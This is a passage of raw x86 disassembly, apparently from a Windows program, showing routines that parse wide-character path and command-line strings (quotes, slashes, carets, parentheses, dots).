  40ec53:	mov    eax,DWORD PTR [ebp-0x1c]
  40ec56:	push   edi
  40ec57:	push   DWORD PTR [ebp-0x20]
  40ec5a:	mov    cx,WORD PTR [ecx+eax*2]
  40ec5e:	call   0x40edb3
  40ec63:	mov    edi,eax
  40ec65:	xor    ecx,ecx
  40ec67:	jmp    0x40ec98
  40ec69:	cmp    esi,ebx
  40ec6b:	jne    0x40ec89
  40ec6d:	push   ecx
  40ec6e:	lea    eax,[ebp-0x24]
  40ec71:	push   eax
  40ec72:	lea    eax,[ebp-0xc]
  40ec75:	push   eax
  40ec76:	lea    edx,[ebp+0x14]
  40ec79:	lea    ecx,[ebp-0x14]
  40ec7c:	call   0x40ea0b
  40ec81:	mov    esi,DWORD PTR [ebp+0x14]
  40ec84:	mov    ebx,DWORD PTR [ebp-0xc]
  40ec87:	xor    ecx,ecx
  40ec89:	mov    ax,WORD PTR [edi]
  40ec8c:	mov    WORD PTR [esi],ax
  40ec8f:	add    esi,DWORD PTR [ebp-0x8]
  40ec92:	add    edi,DWORD PTR [ebp-0x8]
  40ec95:	mov    DWORD PTR [ebp+0x14],esi
  40ec98:	cmp    WORD PTR [edi],cx
  40ec9b:	jne    0x40ec69
  40ec9d:	cmp    esi,ebx
  40ec9f:	jne    0x40ecbd
  40eca1:	push   ecx
  40eca2:	lea    eax,[ebp-0x24]
  40eca5:	push   eax
  40eca6:	lea    eax,[ebp-0xc]
  40eca9:	push   eax
  40ecaa:	lea    edx,[ebp+0x14]
  40ecad:	lea    ecx,[ebp-0x14]
  40ecb0:	call   0x40ea0b
  40ecb5:	mov    esi,DWORD PTR [ebp+0x14]
  40ecb8:	mov    ebx,DWORD PTR [ebp-0xc]
  40ecbb:	xor    ecx,ecx
  40ecbd:	mov    edi,DWORD PTR [ebp-0x28]
  40ecc0:	xor    eax,eax
  40ecc2:	mov    WORD PTR [esi],ax
  40ecc5:	cmp    DWORD PTR [edi],ecx
  40ecc7:	je     0x40ecf8
  40ecc9:	push   0x20
  40eccb:	pop    eax
  40eccc:	mov    WORD PTR [esi],ax
  40eccf:	add    esi,DWORD PTR [ebp-0x8]
  40ecd2:	mov    DWORD PTR [ebp+0x14],esi
  40ecd5:	cmp    esi,ebx
  40ecd7:	jne    0x40ecf3
  40ecd9:	push   ecx
  40ecda:	lea    eax,[ebp-0x24]
  40ecdd:	push   eax
  40ecde:	lea    eax,[ebp-0xc]
  40ece1:	push   eax
  40ece2:	lea    edx,[ebp+0x14]
  40ece5:	lea    ecx,[ebp-0x14]
  40ece8:	call   0x40ea0b
  40eced:	mov    esi,DWORD PTR [ebp+0x14]
  40ecf0:	mov    ebx,DWORD PTR [ebp-0xc]
  40ecf3:	xor    eax,eax
  40ecf5:	mov    WORD PTR [esi],ax
  40ecf8:	mov    edi,DWORD PTR [edi]
  40ecfa:	mov    DWORD PTR [ebp-0x28],edi
  40ecfd:	test   edi,edi
  40ecff:	jne    0x40ebf8
  40ed05:	mov    esi,DWORD PTR [ebp-0x14]
  40ed08:	mov    ebx,DWORD PTR [ebp-0x18]
  40ed0b:	mov    DWORD PTR [ebp-0x24],esi
  40ed0e:	jmp    0x40ed79
  40ed10:	mov    edi,DWORD PTR [ebp-0x8]
  40ed13:	mov    ecx,esi
  40ed15:	xor    ebx,ebx
  40ed17:	lea    edx,[ecx+0x2]
  40ed1a:	mov    ax,WORD PTR [ecx]
  40ed1d:	add    ecx,edi
  40ed1f:	cmp    ax,bx
  40ed22:	jne    0x40ed1a
  40ed24:	sub    ecx,edx
  40ed26:	sar    ecx,1
  40ed28:	lea    edi,[ecx+0x1]
  40ed2b:	cmp    edi,0x1
  40ed2e:	jne    0x40ed33
  40ed30:	mov    edi,DWORD PTR [ebp-0x8]
  40ed33:	xor    ecx,ecx
  40ed35:	mov    eax,edi
  40ed37:	mul    DWORD PTR [ebp-0x8]
  40ed3a:	seto   cl
  40ed3d:	neg    ecx
  40ed3f:	or     ecx,eax
  40ed41:	call   0x40a2fb
  40ed46:	cmp    BYTE PTR [ebp-0x2],0x0
  40ed4a:	mov    ebx,eax
  40ed4c:	je     0x40ed5c
  40ed4e:	push   esi
  40ed4f:	push   edi
  40ed50:	push   0x52
  40ed52:	mov    edx,ebx
  40ed54:	pop    ecx
  40ed55:	call   0x40edb3
  40ed5a:	mov    esi,eax
  40ed5c:	cmp    BYTE PTR [ebp-0x1],0x0
  40ed60:	je     0x40ed79
  40ed62:	mov    eax,DWORD PTR [ebp-0x10]
  40ed65:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ed68:	mov    eax,DWORD PTR [eax]
  40ed6a:	push   esi
  40ed6b:	mov    cx,WORD PTR [eax+ecx*2]
  40ed6f:	push   edi
  40ed70:	mov    edx,ebx
  40ed72:	call   0x40edb3
  40ed77:	mov    esi,eax
  40ed79:	push   DWORD PTR [ebp+0x18]
  40ed7c:	mov    edx,DWORD PTR [ebp-0x10]
  40ed7f:	push   DWORD PTR [ebp+0x10]
  40ed82:	mov    ecx,DWORD PTR [ebp-0x34]
  40ed85:	push   esi
  40ed86:	push   DWORD PTR [ebp+0xc]
  40ed89:	push   DWORD PTR [ebp+0x8]
  40ed8c:	call   0x40ef0b
  40ed91:	mov    eax,DWORD PTR [ebp-0x24]
  40ed94:	test   eax,eax
  40ed96:	je     0x40eda0
  40ed98:	push   eax
  40ed99:	call   DWORD PTR ds:0x43754c
  40ed9f:	pop    ecx
  40eda0:	test   ebx,ebx
  40eda2:	je     0x40edac
  40eda4:	push   ebx
  40eda5:	call   DWORD PTR ds:0x43754c
  40edab:	pop    ecx
  40edac:	pop    edi
  40edad:	pop    esi
  40edae:	pop    ebx
  40edaf:	leave  
  40edb0:	ret    0x14
  40edb3:	push   ebp
  40edb4:	mov    ebp,esp
  40edb6:	sub    esp,0xc
  40edb9:	push   ebx
  40edba:	push   esi
  40edbb:	push   edi
  40edbc:	push   DWORD PTR [ebp+0xc]
  40edbf:	mov    esi,edx
  40edc1:	push   DWORD PTR [ebp+0x8]
  40edc4:	xor    eax,eax
  40edc6:	push   esi
  40edc7:	mov    WORD PTR [ebp-0x2],cx
  40edcb:	mov    DWORD PTR [ebp-0x8],eax
  40edce:	mov    ebx,eax
  40edd0:	mov    edi,eax
  40edd2:	mov    DWORD PTR [ebp-0xc],esi
  40edd5:	call   DWORD PTR ds:0x4373d0
  40eddb:	add    esp,0xc
  40edde:	test   eax,eax
  40ede0:	je     0x40edf4
  40ede2:	push   0x410
  40ede7:	push   DWORD PTR ds:0x4216e0
  40eded:	call   0x405021
  40edf2:	pop    ecx
  40edf3:	pop    ecx
  40edf4:	push   0x22
  40edf6:	pop    eax
  40edf7:	cmp    WORD PTR [esi],ax
  40edfa:	mov    ecx,esi
  40edfc:	sete   BYTE PTR [ebp+0xf]
  40ee00:	lea    edx,[ecx+0x2]
  40ee03:	mov    ax,WORD PTR [ecx]
  40ee06:	add    ecx,0x2
  40ee09:	cmp    ax,WORD PTR [ebp-0x8]
  40ee0d:	jne    0x40ee03
  40ee0f:	sub    ecx,edx
  40ee11:	sar    ecx,1
  40ee13:	lea    eax,[esi-0x2]
  40ee16:	lea    eax,[eax+ecx*2]
  40ee19:	jmp    0x40ee36
  40ee1b:	movzx  ecx,WORD PTR [eax]
  40ee1e:	cmp    ecx,0x5c
  40ee21:	je     0x40ee3c
  40ee23:	cmp    ecx,0x2f
  40ee26:	je     0x40ee3c
  40ee28:	cmp    ecx,0x2e
  40ee2b:	jne    0x40ee33
  40ee2d:	test   ebx,ebx
  40ee2f:	jne    0x40ee33
  40ee31:	mov    ebx,eax
  40ee33:	sub    eax,0x2
  40ee36:	cmp    eax,esi
  40ee38:	jae    0x40ee1b
  40ee3a:	jmp    0x40ee3e
  40ee3c:	mov    edi,eax
  40ee3e:	movzx  eax,WORD PTR [ebp-0x2]
  40ee42:	sub    eax,0x42
  40ee45:	je     0x40eeb2
  40ee47:	dec    eax
  40ee48:	dec    eax
  40ee49:	je     0x40ee5d
  40ee4b:	dec    eax
  40ee4c:	dec    eax
  40ee4d:	je     0x40eebb
  40ee4f:	sub    eax,0xc
  40ee52:	jne    0x40eece
  40ee54:	test   ebx,ebx
  40ee56:	je     0x40eece
  40ee58:	mov    WORD PTR [ebx],ax
  40ee5b:	jmp    0x40eece
  40ee5d:	test   edi,edi
  40ee5f:	je     0x40ee79
  40ee61:	cmp    WORD PTR [esi+0x2],0x3a
  40ee66:	jne    0x40ee72
  40ee68:	lea    eax,[esi+0x4]
  40ee6b:	cmp    edi,eax
  40ee6d:	jne    0x40ee72
  40ee6f:	add    edi,0x2
  40ee72:	xor    eax,eax
  40ee74:	mov    WORD PTR [edi],ax
  40ee77:	jmp    0x40eece
  40ee79:	cmp    WORD PTR [esi+0x2],0x3a
  40ee7e:	jne    0x40ee88
  40ee80:	xor    eax,eax
  40ee82:	mov    WORD PTR [esi+0x4],ax
  40ee86:	jmp    0x40eece
  40ee88:	push   0x401914
  40ee8d:	push   DWORD PTR [ebp+0x8]
  40ee90:	push   esi
  40ee91:	call   DWORD PTR ds:0x4373d0
  40ee97:	add    esp,0xc
  40ee9a:	test   eax,eax
  40ee9c:	je     0x40eece
  40ee9e:	push   0x410
  40eea3:	push   DWORD PTR ds:0x4216e0
  40eea9:	call   0x405021
  40eeae:	pop    ecx
  40eeaf:	pop    ecx
  40eeb0:	jmp    0x40eece
  40eeb2:	test   ebx,ebx
  40eeb4:	je     0x40eebb
  40eeb6:	xor    eax,eax
  40eeb8:	mov    WORD PTR [ebx],ax
  40eebb:	test   edi,edi
  40eebd:	je     0x40eec4
  40eebf:	lea    esi,[edi+0x2]
  40eec2:	jmp    0x40eece
  40eec4:	cmp    WORD PTR [esi+0x2],0x3a
  40eec9:	jne    0x40eece
  40eecb:	add    esi,0x4
  40eece:	cmp    BYTE PTR [ebp+0xf],0x0
  40eed2:	je     0x40ef02
  40eed4:	push   0x22
  40eed6:	pop    ebx
  40eed7:	cmp    WORD PTR [esi],bx
  40eeda:	je     0x40eee7
  40eedc:	cmp    esi,DWORD PTR [ebp-0xc]
  40eedf:	jbe    0x40eee7
  40eee1:	sub    esi,0x2
  40eee4:	mov    WORD PTR [esi],bx
  40eee7:	xor    eax,eax
  40eee9:	push   eax
  40eeea:	push   esi
  40eeeb:	call   DWORD PTR ds:0x437540
  40eef1:	pop    ecx
  40eef2:	pop    ecx
  40eef3:	cmp    WORD PTR [eax-0x2],bx
  40eef7:	je     0x40ef02
  40eef9:	xor    ecx,ecx
  40eefb:	mov    WORD PTR [eax],bx
  40eefe:	mov    WORD PTR [eax+0x2],cx
  40ef02:	pop    edi
  40ef03:	mov    eax,esi
  40ef05:	pop    esi
  40ef06:	pop    ebx
  40ef07:	leave  
  40ef08:	ret    0x8
  40ef0b:	push   ebp
  40ef0c:	mov    ebp,esp
  40ef0e:	sub    esp,0x18
  40ef11:	push   ebx
  40ef12:	push   esi
  40ef13:	mov    esi,edx
  40ef15:	push   edi
  40ef16:	add    DWORD PTR [esi],0x2
  40ef19:	mov    eax,DWORD PTR [esi]
  40ef1b:	mov    ebx,ecx
  40ef1d:	push   0x5e
  40ef1f:	pop    ecx
  40ef20:	mov    DWORD PTR [ebp-0x14],esi
  40ef23:	mov    DWORD PTR [ebp-0x10],ebx
  40ef26:	mov    DWORD PTR [ebp-0xc],ecx
  40ef29:	cmp    WORD PTR [eax],cx
  40ef2c:	jne    0x40ef33
  40ef2e:	add    eax,0x2
  40ef31:	mov    DWORD PTR [esi],eax
  40ef33:	push   0x3a
  40ef35:	push   DWORD PTR [esi]
  40ef37:	call   DWORD PTR ds:0x437540
  40ef3d:	mov    edi,DWORD PTR [esi]
  40ef3f:	pop    ecx
  40ef40:	pop    ecx
  40ef41:	mov    DWORD PTR [ebp-0x4],eax
  40ef44:	mov    ecx,edi
  40ef46:	mov    DWORD PTR [ebp-0x8],0x29
  40ef4d:	jmp    0x40ef61
  40ef4f:	cmp    dx,WORD PTR [ebp-0x8]
  40ef53:	je     0x40ef69
  40ef55:	cmp    dx,WORD PTR [ebp-0xc]
  40ef59:	jne    0x40ef5e
  40ef5b:	add    ecx,0x2
  40ef5e:	add    ecx,0x2
  40ef61:	movzx  edx,WORD PTR [ecx]
  40ef64:	test   dx,dx
  40ef67:	jne    0x40ef4f
  40ef69:	push   0x28
  40ef6b:	pop    edx
  40ef6c:	cmp    WORD PTR [edi],dx
  40ef6f:	jne    0x40ef99
  40ef71:	test   eax,eax
  40ef73:	je     0x40ef99
  40ef75:	cmp    eax,ecx
  40ef77:	jae    0x40ef99
  40ef79:	push   DWORD PTR [ebp+0x18]
  40ef7c:	lea    edx,[ebp-0x4]
  40ef7f:	push   DWORD PTR [ebp+0x14]
  40ef82:	mov    ecx,ebx
  40ef84:	push   DWORD PTR [ebp+0x10]
  40ef87:	push   DWORD PTR [ebp+0xc]
  40ef8a:	push   DWORD PTR [ebp+0x8]
  40ef8d:	call   0x40f01f
  40ef92:	mov    eax,DWORD PTR [ebp-0x4]
  40ef95:	mov    DWORD PTR [esi],eax
  40ef97:	jmp    0x40f018
  40ef99:	mov    edi,DWORD PTR [ebp+0x10]
  40ef9c:	xor    eax,eax
  40ef9e:	cmp    WORD PTR [edi],ax
  40efa1:	je     0x40efdd
  40efa3:	mov    ebx,DWORD PTR [ebp+0x8]
  40efa6:	mov    esi,DWORD PTR [ebp+0xc]
  40efa9:	mov    eax,DWORD PTR [ebx]
  40efab:	cmp    eax,DWORD PTR [esi]
  40efad:	jne    0x40efc0
  40efaf:	push   DWORD PTR [ebp+0x18]
  40efb2:	mov    ecx,DWORD PTR [ebp-0x10]
  40efb5:	push   DWORD PTR [ebp+0x14]
  40efb8:	mov    edx,ebx
  40efba:	push   esi
  40efbb:	call   0x40ea0b
  40efc0:	mov    ecx,DWORD PTR [ebx]
  40efc2:	mov    ax,WORD PTR [edi]
  40efc5:	mov    WORD PTR [ecx],ax
  40efc8:	lea    eax,[ecx+0x2]
  40efcb:	mov    DWORD PTR [ebx],eax
  40efcd:	add    edi,0x2
  40efd0:	xor    eax,eax
  40efd2:	cmp    WORD PTR [edi],ax
  40efd5:	jne    0x40efa9
  40efd7:	mov    esi,DWORD PTR [ebp-0x14]
  40efda:	push   0x28
  40efdc:	pop    edx
  40efdd:	mov    eax,DWORD PTR [esi]
  40efdf:	cmp    WORD PTR [eax],0x24
  40efe3:	jne    0x40efea
  40efe5:	add    eax,0x2
  40efe8:	mov    DWORD PTR [esi],eax
  40efea:	mov    ecx,DWORD PTR [esi]
  40efec:	movzx  eax,WORD PTR [ecx]
  40efef:	cmp    ax,dx
  40eff2:	jne    0x40f003
  40eff4:	mov    ecx,DWORD PTR [ebp-0x8]
  40eff7:	add    DWORD PTR [esi],0x2
  40effa:	mov    eax,DWORD PTR [esi]
  40effc:	cmp    WORD PTR [eax],cx
  40efff:	jne    0x40eff7
  40f001:	jmp    0x40f015
  40f003:	push   0x2a
  40f005:	pop    edx
  40f006:	cmp    ax,dx
  40f009:	jne    0x40f015
  40f00b:	lea    eax,[ecx+0x2]
  40f00e:	cmp    WORD PTR [eax],dx
  40f011:	jne    0x40f015
  40f013:	mov    DWORD PTR [esi],eax
  40f015:	add    DWORD PTR [esi],0x2
  40f018:	pop    edi
  40f019:	pop    esi
  40f01a:	pop    ebx
  40f01b:	leave  
  40f01c:	ret    0x14
  40f01f:	push   ebp
  40f020:	mov    ebp,esp
  40f022:	sub    esp,0x20
  40f025:	push   ebx
  40f026:	push   esi
  40f027:	push   edi
  40f028:	push   0x2
  40f02a:	mov    DWORD PTR [ebp-0x10],ecx
  40f02d:	pop    ecx
  40f02e:	mov    edi,edx
  40f030:	push   0x3d
  40f032:	add    DWORD PTR [edi],ecx
  40f034:	mov    esi,DWORD PTR [edi]
  40f036:	pop    edx
  40f037:	push   0x5e
  40f039:	pop    ebx
  40f03a:	mov    DWORD PTR [ebp-0x1c],edi
  40f03d:	mov    DWORD PTR [ebp-0x8],edx
  40f040:	mov    DWORD PTR [ebp-0x14],ebx
  40f043:	jmp    0x40f053
  40f045:	cmp    ax,dx
  40f048:	je     0x40f072
  40f04a:	cmp    ax,bx
  40f04d:	jne    0x40f051
  40f04f:	add    esi,ecx
  40f051:	add    esi,ecx
  40f053:	movzx  eax,WORD PTR [esi]
  40f056:	test   ax,ax
  40f059:	jne    0x40f045
  40f05b:	cmp    WORD PTR [esi],dx
  40f05e:	je     0x40f072
  40f060:	push   0x3eb
  40f065:	push   DWORD PTR ds:0x4216d4
  40f06b:	call   0x405021
  40f070:	pop    ecx
  40f071:	pop    ecx
  40f072:	cmp    esi,DWORD PTR [edi]
  40f074:	jne    0x40f088
  40f076:	push   0x3ed
  40f07b:	push   DWORD PTR ds:0x4216d4
  40f081:	call   0x405021
  40f086:	pop    ecx
  40f087:	pop    ecx
  40f088:	xor    eax,eax
  40f08a:	mov    ebx,esi
  40f08c:	push   0x29
  40f08e:	mov    DWORD PTR [ebp-0xc],ebx
  40f091:	pop    edx
  40f092:	mov    DWORD PTR [ebp-0x18],eax
  40f095:	cmp    WORD PTR [esi],ax
  40f098:	je     0x40f0bb
  40f09a:	push   0x5e
  40f09c:	pop    ecx
  40f09d:	movzx  eax,WORD PTR [ebx]
  40f0a0:	cmp    ax,dx
  40f0a3:	je     0x40f0d2
  40f0a5:	push   0x2
  40f0a7:	cmp    ax,cx
  40f0aa:	pop    eax
  40f0ab:	jne    0x40f0af
  40f0ad:	add    ebx,eax
  40f0af:	add    ebx,eax
  40f0b1:	xor    eax,eax
  40f0b3:	mov    DWORD PTR [ebp-0xc],ebx
  40f0b6:	cmp    WORD PTR [ebx],ax
  40f0b9:	jne    0x40f09d
  40f0bb:	cmp    WORD PTR [ebx],dx
  40f0be:	je     0x40f0d2
  40f0c0:	push   0x3e8
  40f0c5:	push   DWORD PTR ds:0x4216d4
  40f0cb:	call   0x405021
  40f0d0:	pop    ecx
  40f0d1:	pop    ecx
  40f0d2:	mov    eax,esi
  40f0d4:	sub    eax,DWORD PTR [edi]
  40f0d6:	xor    ecx,ecx
  40f0d8:	sar    eax,1
  40f0da:	push   0x2
  40f0dc:	inc    eax
  40f0dd:	pop    edx
  40f0de:	mul    edx
  40f0e0:	seto   cl
  40f0e3:	neg    ecx
  40f0e5:	or     ecx,eax
  40f0e7:	call   0x40a2fb
  40f0ec:	mov    edi,DWORD PTR [edi]
  40f0ee:	mov    DWORD PTR [ebp-0x4],eax
  40f0f1:	movzx  ecx,WORD PTR [edi]
  40f0f4:	mov    edx,eax
  40f0f6:	cmp    cx,WORD PTR [ebp-0x8]
  40f0fa:	je     0x40f120
  40f0fc:	push   0x2
  40f0fe:	pop    eax
  40f0ff:	cmp    cx,WORD PTR [ebp-0x14]
  40f103:	jne    0x40f107
  40f105:	add    edi,eax
  40f107:	mov    ax,WORD PTR [edi]
  40f10a:	mov    WORD PTR [edx],ax
  40f10d:	push   0x2
  40f10f:	pop    eax
  40f110:	add    edi,eax
  40f112:	add    edx,eax
  40f114:	movzx  ecx,WORD PTR [edi]
  40f117:	cmp    cx,WORD PTR [ebp-0x8]
  40f11b:	jne    0x40f0ff
  40f11d:	mov    eax,DWORD PTR [ebp-0x4]
  40f120:	xor    ecx,ecx
  40f122:	mov    WORD PTR [edx],cx
  40f125:	mov    ecx,eax
  40f127:	lea    edx,[ecx+0x2]
  40f12a:	mov    ax,WORD PTR [ecx]
  40f12d:	add    ecx,0x2
  40f130:	cmp    ax,WORD PTR [ebp-0x18]
  40f134:	jne    0x40f12a
  40f136:	sub    ecx,edx
  40f138:	sar    ecx,1
  40f13a:	mov    DWORD PTR [ebp-0x8],ecx
  40f13d:	mov    eax,ebx
  40f13f:	sub    eax,esi
  40f141:	xor    ecx,ecx
  40f143:	push   0x2
  40f145:	sar    eax,1
  40f147:	pop    esi
  40f148:	mul    esi
  40f14a:	seto   cl
  40f14d:	neg    ecx
  40f14f:	or     ecx,eax
  40f151:	call   0x40a2fb
  40f156:	add    edi,esi
  40f158:	push   0x29
  40f15a:	movzx  edx,WORD PTR [edi]
  40f15d:	mov    DWORD PTR [ebp-0x14],eax
  40f160:	mov    ecx,eax
  40f162:	pop    eax
  40f163:	cmp    dx,ax
  40f166:	je     0x40f18a
  40f168:	push   0x5e
  40f16a:	pop    ebx
  40f16b:	cmp    dx,bx
  40f16e:	jne    0x40f172
  40f170:	add    edi,esi
  40f172:	mov    ax,WORD PTR [edi]
  40f175:	add    edi,esi
  40f177:	mov    WORD PTR [ecx],ax
  40f17a:	movzx  edx,WORD PTR [edi]
  40f17d:	push   0x29
  40f17f:	pop    eax
  40f180:	add    ecx,esi
  40f182:	cmp    dx,ax
  40f185:	jne    0x40f16b
  40f187:	mov    ebx,DWORD PTR [ebp-0xc]
  40f18a:	mov    esi,DWORD PTR [ebp+0x10]
  40f18d:	xor    eax,eax
  40f18f:	mov    WORD PTR [ecx],ax
  40f192:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f195:	lea    eax,[ebx+0x2]
  40f198:	mov    DWORD PTR [ecx],eax
  40f19a:	movzx  eax,WORD PTR [esi]
  40f19d:	test   ax,ax
  40f1a0:	je     0x40f254
  40f1a6:	mov    edi,DWORD PTR [ebp+0x8]
  40f1a9:	mov    ebx,DWORD PTR [ebp-0x8]
  40f1ac:	mov    ecx,DWORD PTR [ebp-0x4]
  40f1af:	cmp    ax,WORD PTR [ecx]
  40f1b2:	jne    0x40f219
  40f1b4:	push   ebx
  40f1b5:	push   ecx
  40f1b6:	push   esi
  40f1b7:	call   DWORD PTR ds:0x437478
  40f1bd:	add    esp,0xc
  40f1c0:	test   eax,eax
  40f1c2:	jne    0x40f219
  40f1c4:	mov    eax,DWORD PTR [ebp-0x14]
  40f1c7:	xor    ecx,ecx
  40f1c9:	mov    edx,eax
  40f1cb:	mov    DWORD PTR [ebp+0x8],eax
  40f1ce:	cmp    WORD PTR [eax],cx
  40f1d1:	je     0x40f214
  40f1d3:	mov    ebx,DWORD PTR [ebp+0xc]
  40f1d6:	mov    esi,DWORD PTR [ebp-0x10]
  40f1d9:	mov    eax,DWORD PTR [edi]
  40f1db:	cmp    eax,DWORD PTR [ebx]
  40f1dd:	jne    0x40f1f2
  40f1df:	push   DWORD PTR [ebp+0x18]
  40f1e2:	mov    edx,edi
  40f1e4:	push   DWORD PTR [ebp+0x14]
  40f1e7:	mov    ecx,esi
  40f1e9:	push   ebx
  40f1ea:	call   0x40ea0b
  40f1ef:	mov    edx,DWORD PTR [ebp+0x8]
  40f1f2:	mov    ecx,DWORD PTR [edi]
  40f1f4:	mov    ax,WORD PTR [edx]
  40f1f7:	mov    WORD PTR [ecx],ax
  40f1fa:	lea    eax,[ecx+0x2]
  40f1fd:	mov    DWORD PTR [edi],eax
  40f1ff:	push   0x2
  40f201:	pop    eax
  40f202:	add    edx,eax
  40f204:	xor    eax,eax
  40f206:	mov    DWORD PTR [ebp+0x8],edx
  40f209:	cmp    WORD PTR [edx],ax
  40f20c:	jne    0x40f1d9
  40f20e:	mov    esi,DWORD PTR [ebp+0x10]
  40f211:	mov    ebx,DWORD PTR [ebp-0x8]
  40f214:	lea    esi,[esi+ebx*2]
  40f217:	jmp    0x40f245
  40f219:	mov    ecx,DWORD PTR [ebp+0xc]
  40f21c:	mov    eax,DWORD PTR [edi]
  40f21e:	cmp    eax,DWORD PTR [ecx]
  40f220:	jne    0x40f233
  40f222:	push   DWORD PTR [ebp+0x18]
  40f225:	mov    edx,edi
  40f227:	push   DWORD PTR [ebp+0x14]
  40f22a:	push   ecx
  40f22b:	mov    ecx,DWORD PTR [ebp-0x10]
  40f22e:	call   0x40ea0b
  40f233:	mov    ecx,DWORD PTR [edi]
  40f235:	mov    ax,WORD PTR [esi]
  40f238:	mov    WORD PTR [ecx],ax
  40f23b:	lea    eax,[ecx+0x2]
  40f23e:	push   0x2
  40f240:	mov    DWORD PTR [edi],eax
  40f242:	pop    eax
  40f243:	add    esi,eax
  40f245:	movzx  eax,WORD PTR [esi]
  40f248:	mov    DWORD PTR [ebp+0x10],esi
  40f24b:	test   ax,ax
  40f24e:	jne    0x40f1ac
  40f254:	push   DWORD PTR [ebp-0x4]
  40f257:	mov    esi,DWORD PTR ds:0x43754c
  40f25d:	call   esi
  40f25f:	pop    ecx
  40f260:	push   DWORD PTR [ebp-0x14]
  40f263:	call   esi
  40f265:	pop    ecx
  40f266:	pop    edi
  40f267:	pop    esi
  40f268:	pop    ebx
  40f269:	leave  
  40f26a:	ret    0x14
  40f26d:	push   ebp
  40f26e:	mov    ebp,esp
  40f270:	sub    esp,0x418
  40f276:	mov    eax,ds:0x411018
  40f27b:	xor    eax,ebp
  40f27d:	mov    DWORD PTR [ebp-0x4],eax
  40f280:	push   esi
  40f281:	push   edi
  40f282:	xor    edi,edi
  40f284:	push   edi
  40f285:	push   edi
  40f286:	push   edi
  40f287:	push   edi
  40f288:	push   0x100
  40f28d:	lea    eax,[ebp-0x210]
  40f293:	push   eax
  40f294:	push   0x3
  40f296:	lea    eax,[ebp-0xc]
  40f299:	push   eax
  40f29a:	push   ecx
  40f29b:	mov    esi,edx
  40f29d:	call   DWORD PTR ds:0x437438
  40f2a3:	add    esp,0x24
  40f2a6:	lea    eax,[ebp-0x210]
  40f2ac:	push   edi
  40f2ad:	push   esi
  40f2ae:	push   eax
  40f2af:	lea    eax,[ebp-0xc]
  40f2b2:	push   eax
  40f2b3:	lea    eax,[ebp-0x418]
  40f2b9:	push   0x104
  40f2be:	push   eax
  40f2bf:	call   DWORD PTR ds:0x43743c
  40f2c5:	add    esp,0x18
  40f2c8:	lea    ecx,[ebp-0x418]
  40f2ce:	call   0x40dd18
  40f2d3:	mov    ecx,DWORD PTR [ebp-0x4]
  40f2d6:	pop    edi
  40f2d7:	xor    ecx,ebp
  40f2d9:	pop    esi
  40f2da:	call   0x40fd0b
  40f2df:	leave  
  40f2e0:	ret    
  40f2e1:	push   ebp
  40f2e2:	mov    ebp,esp
  40f2e4:	sub    esp,0xc
  40f2e7:	push   ebx
  40f2e8:	push   esi
  40f2e9:	push   edi
  40f2ea:	push   0x5e
  40f2ec:	pop    edx
  40f2ed:	push   0x2
  40f2ef:	pop    edi
  40f2f0:	push   0x7b
  40f2f2:	pop    esi
  40f2f3:	xor    ebx,ebx
  40f2f5:	mov    DWORD PTR [ebp-0x4],0x7d
  40f2fc:	mov    DWORD PTR [ebp-0x8],edx
  40f2ff:	cmp    WORD PTR [ecx],si
  40f302:	jne    0x40f32c
  40f304:	add    ecx,edi
  40f306:	movzx  eax,WORD PTR [ecx]
  40f309:	test   ax,ax
  40f30c:	je     0x40f32c
  40f30e:	cmp    ax,WORD PTR [ebp-0x4]
  40f312:	je     0x40f325
  40f314:	cmp    ax,dx
  40f317:	jne    0x40f31b
  40f319:	add    ecx,edi
  40f31b:	add    ecx,edi
  40f31d:	movzx  eax,WORD PTR [ecx]
  40f320:	test   ax,ax
  40f323:	jne    0x40f30e
  40f325:	cmp    WORD PTR [ecx],bx
  40f328:	je     0x40f32c
  40f32a:	add    ecx,edi
  40f32c:	push   0x2e
  40f32e:	pop    eax
  40f32f:	cmp    WORD PTR [ecx],ax
  40f332:	jne    0x40f426
  40f338:	mov    eax,ecx
  40f33a:	movzx  edx,WORD PTR [eax]
  40f33d:	cmp    dx,si
  40f340:	je     0x40f351
  40f342:	cmp    dx,WORD PTR [ebp-0x8]
  40f346:	jne    0x40f34a
  40f348:	add    eax,edi
  40f34a:	add    eax,edi
  40f34c:	cmp    WORD PTR [eax],bx
  40f34f:	jne    0x40f33a
  40f351:	push   0x2f
  40f353:	pop    edx
  40f354:	mov    esi,ecx
  40f356:	mov    DWORD PTR [ebp-0x8],0x5c
  40f35d:	mov    DWORD PTR [ebp-0xc],edx
  40f360:	cmp    ecx,eax
  40f362:	jae    0x40f37c
  40f364:	movzx  edx,WORD PTR [ecx]
  40f367:	cmp    dx,WORD PTR [ebp-0x8]
  40f36b:	je     0x40f379
  40f36d:	cmp    dx,WORD PTR [ebp-0xc]
  40f371:	je     0x40f379
  40f373:	add    ecx,edi
  40f375:	cmp    ecx,eax
  40f377:	jb     0x40f364
  40f379:	push   0x2f
  40f37b:	pop    edx
  40f37c:	cmp    WORD PTR [eax],bx
  40f37f:	je     0x40f3c3
  40f381:	cmp    ecx,eax
  40f383:	jne    0x40f3c3
  40f385:	add    eax,edi
  40f387:	movzx  ecx,WORD PTR [eax]
  40f38a:	test   cx,cx
  40f38d:	je     0x40f426
  40f393:	push   0x5e
  40f395:	pop    esi
  40f396:	cmp    cx,WORD PTR [ebp-0x4]
  40f39a:	je     0x40f3ad
  40f39c:	cmp    cx,si
  40f39f:	jne    0x40f3a3
  40f3a1:	add    eax,edi
  40f3a3:	add    eax,edi
  40f3a5:	movzx  ecx,WORD PTR [eax]
  40f3a8:	test   cx,cx
  40f3ab:	jne    0x40f396
  40f3ad:	cmp    WORD PTR [eax],bx
  40f3b0:	je     0x40f426
  40f3b2:	push   0x2e
  40f3b4:	pop    ecx
  40f3b5:	cmp    WORD PTR [eax+edi*1],cx
  40f3b9:	jne    0x40f426
  40f3bb:	lea    esi,[edi+0x2]
  40f3be:	add    esi,eax
  40f3c0:	push   edx
  40f3c1:	jmp    0x40f3e7
  40f3c3:	lea    eax,[esi+0x2]
  40f3c6:	push   0x4026ac
  40f3cb:	push   eax
  40f3cc:	call   DWORD PTR ds:0x437544
  40f3d2:	pop    ecx
  40f3d3:	pop    ecx
  40f3d4:	test   eax,eax
  40f3d6:	je     0x40f426
  40f3d8:	push   0x2e
  40f3da:	pop    ecx
  40f3db:	cmp    WORD PTR [eax],cx
  40f3de:	jne    0x40f426
  40f3e0:	push   0x2f
  40f3e2:	lea    esi,[eax+0x2]
  40f3e5:	pop    eax
